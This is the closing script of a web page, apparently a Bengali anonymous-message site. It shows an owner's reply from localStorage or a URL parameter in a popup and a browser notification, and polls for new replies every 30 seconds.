// The bot.js sets a flag via a webhook call to your backend
// For pure-static, we use a simple polling approach:
// Owner sends reply via bot -> bot posts to a public pastebin/jsonbin -> site checks it
// Simpler approach: store reply in localStorage via bot webhook -> serverless function
// ──────────────────────────────────────────────
function checkReply(){
  // Check if there's a pending reply stored
  const pendingReply=localStorage.getItem('smb_pending_reply');
  if(pendingReply){
    const seen=localStorage.getItem('smb_reply_seen');
    if(!seen){
      const r=JSON.parse(pendingReply);
      document.getElementById('reply-body-text').textContent=r.msg;
      document.getElementById('reply-time-text').textContent='🕐 '+r.time;
      document.getElementById('reply-popup').classList.add('show');
      // Push notification
      if(Notification.permission==='granted'){
        new Notification('💌 তোমার কাছে Reply এসেছে!',{
          body: r.msg.substring(0,100),
          icon:'https://emojicdn.elk.sh/💌'
        });
      }
    }
  }
}

function closeReplyPopup(){
  document.getElementById('reply-popup').classList.remove('show');
  localStorage.setItem('smb_reply_seen','1');
  // Move to recv history
  const r=JSON.parse(localStorage.getItem('smb_pending_reply')||'null');
  if(r) saveReceivedMsg(r.msg,r.time);
}

// Poll every 30s
checkReply();
setInterval(checkReply,30000);

// ──────────────────────────────────────────────
// URL param: ?reply=MSG&time=TIME (set by webhook)
// ──────────────────────────────────────────────
(function checkUrlReply(){
  const p=new URLSearchParams(location.search);
  if(p.get('reply')){
    const r={msg:decodeURIComponent(p.get('reply')),time:p.get('time')||new Date().toLocaleString('bn-BD')};
    localStorage.setItem('smb_pending_reply',JSON.stringify(r));
    localStorage.removeItem('smb_reply_seen');
    history.replaceState({},'',location.pathname);
    checkReply();
  }
})();
</script>
</body>
</html>
